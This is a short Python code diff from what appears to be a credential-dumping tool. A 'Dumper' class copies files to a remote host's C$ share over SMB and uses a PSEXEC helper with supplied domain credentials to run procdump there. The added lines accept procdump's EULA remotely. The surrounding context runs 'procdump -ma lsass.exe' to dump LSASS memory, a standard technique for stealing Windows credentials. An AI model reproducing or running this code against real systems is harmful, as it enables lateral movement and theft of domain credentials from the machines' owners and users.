@@ -89,7 +89,24 @@ class Dumper:
         self.smb.putFile("C$", filename, open(src, "rb").read)
 
     def exec_procdump(self):
-
+        executer = PSEXEC(
+            " ".join(["C:\\procdump.exe -accepteula"]),
+            None,
+            None,
+            None,
+            int(445),
+            self.credentials["username"],
+            self.credentials["password"],
+            self.credentials["domain"],
+            None,
+            None,
+            False,
+            None,
+            "",
+        )
+        executer.run(
+            remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
+        )
         executer = PSEXEC(
             " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
             None,
